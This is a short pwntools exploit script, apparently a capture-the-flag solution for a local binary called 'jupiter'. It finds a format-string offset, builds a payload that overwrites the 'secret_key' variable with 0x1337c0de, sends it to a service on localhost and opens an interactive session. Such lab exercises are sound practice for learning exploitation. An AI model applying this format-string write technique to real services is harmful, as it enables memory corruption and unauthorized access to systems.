from pwn import *

exe = ELF('.build/jupiter')
context.binary = exe

def exec_fmt(payload):
	p = exe.process()
	p.sendlineafter(b': ', payload)
	return p.recvall()

fmt = FmtStr(exec_fmt)

p = remote('localhost', 25607) #exe.process(stderr=PIPE)

payload = fmtstr_payload(fmt.offset, {exe.sym['secret_key'] : 0x1337c0de})

info(f"[~] Payload = {payload}, len = {len(payload)}")

p.sendlineafter(b': ', payload)

p.recvuntil(b': ')

p.interactive()
